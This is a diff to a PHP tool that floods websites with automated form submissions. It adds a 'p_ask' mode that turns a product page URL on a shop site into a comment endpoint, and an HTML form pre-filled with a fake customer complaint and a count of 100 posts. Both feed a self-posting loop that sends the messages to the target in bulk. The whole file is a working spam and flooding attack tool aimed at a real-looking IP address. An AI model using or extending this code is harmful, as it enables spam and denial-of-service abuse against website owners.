@@ -300,9 +300,7 @@ class browser{
     }
     
     function nonblock_post($url,$data){
-    	$mch = curl_multi_init();
 		$curl = curl_init();
-
       	curl_setopt($curl, CURLOPT_URL, $url); 
         curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
         curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1); 
@@ -315,14 +313,10 @@ class browser{
         curl_setopt($curl, CURLOPT_TIMEOUT, 30); 
         curl_setopt($curl, CURLOPT_HEADER, 0); 
         curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
+	
+		$mc = EpiCurl::getInstance();
+		$curl1 = $mc->addCurl($curl);	
 
-		curl_multi_add_handle($mch ,$curl);
-		$running = null;
-		do {
-    		curl_multi_exec($mch ,$running);
-		} while($running > 0);
-		curl_multi_remove_handle($mch,$curl);
-		curl_close($curl);
     }
        
 }
@@ -336,23 +330,19 @@ if($_POST){
             $post_data = "subject=".urlencode($_POST[e_subject])."&message=".urlencode($_POST[e_content])."&email={$_POST[e_name]}";
             $num = intval($_POST['e_num']);
             $num = $num ? $num : 100;
-           	$host = isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:$_SERVER['HTTP_HOST'];
-           	$host = rtrim($host,'/');
-           	$uri = $_SERVER['PHP_SELF'];
-           	$uri = ltrim($uri,'/');
-           	$url = "http://$host/$uri";
-        	$data = "action=flood&post_url=$post_url&$post_data";
-        	$b = new browser;
-            $step = floor($num / $thread);
             
-            for($i=0;$i<$step;$i++){
-            	$ret = $b->nonblock_post($url,$data);
-                echo "……$ret……";
-                usleep(100);
-                ob_flush();
-           		flush();
-            }
-            
+        break;
+        
+        case "p_ask":
+        	if(!preg_match('/(http:\/\/.*)\/.*([0-9]+).html/',$_POST['e_p_url'],$ret)){
+        		exit;
+        	}
+			$domain = $ret[1];
+			$p_id = $ret[2];
+        	$post_url = $domain."/?comment-".$p_id."-ask-toComment.html";
+            $post_data = "title=".urlencode($_POST[e_title])."&contact=".$_POST[e_contact]."&comment=".urlencode($_POST[e_comment]);
+            $num = intval($_POST['e_num']);
+            $num = $num ? $num : 100;
         break;
         
         case "flood":
@@ -367,6 +357,24 @@ if($_POST){
     		exit;
         break;
     }
+    
+    $host = isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:$_SERVER['HTTP_HOST'];
+   	$host = rtrim($host,'/');
+   	$uri = $_SERVER['PHP_SELF'];
+   	$uri = ltrim($uri,'/');
+   	$url = "http://$host/$uri";
+	$data = "action=flood&post_url=$post_url&$post_data";
+	$b = new browser;
+    $step = ceil($num / $thread);
+    
+    for($i=0;$i<$step;$i++){
+    	$b->nonblock_post($url,$data);
+        echo "……ok……";
+        usleep(500);
+        ob_flush();
+   		flush();
+    }
+    echo "<script>alert('all done');</script>";
 }
 
 ?>
@@ -375,6 +383,7 @@ if($_POST){
 <head> 
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
 </head>
+
 <form method=post>
 <div style="width:50%">
 <fieldset>
@@ -392,6 +401,28 @@ if($_POST){
 <input type='submit' value='start'>
 
 </form>
+
+
+
+<form method=post>
+<div style="width:50%">
+<fieldset>
+<legend>商品咨询</legend>
+<table>
+<tr><td>用户名：</td><td><input type='text' name='e_contact' size=32 value='noname@nowhere.com'></td></tr>
+<tr><td>主题：</td><td><input type='text' name='e_title' size=32 value='这个商品挺奇怪'></td></tr>
+<tr><td >留言:</td><td><textarea name='e_comment' cols=50 rows=5 >是这样的，衣服的颜色太淡了，我觉得问题很严重，请尽快解决，我的电话是13800138000！</textarea></td></tr>
+<tr><td>发送条数:</td><td><input type='text' name='e_num' value=100></td></tr>
+<tr><td>网站地址:</td><td><input type='text' name='e_p_url' size=32 value=http://61.152.76.187/?product-37.html></td></tr>
+<input type='hidden' name='action' value='p_ask'>
+</table>
+</fieldset>
+</div>
+<input type='submit' value='start'>
+
+</form>
+
+
 
 
 
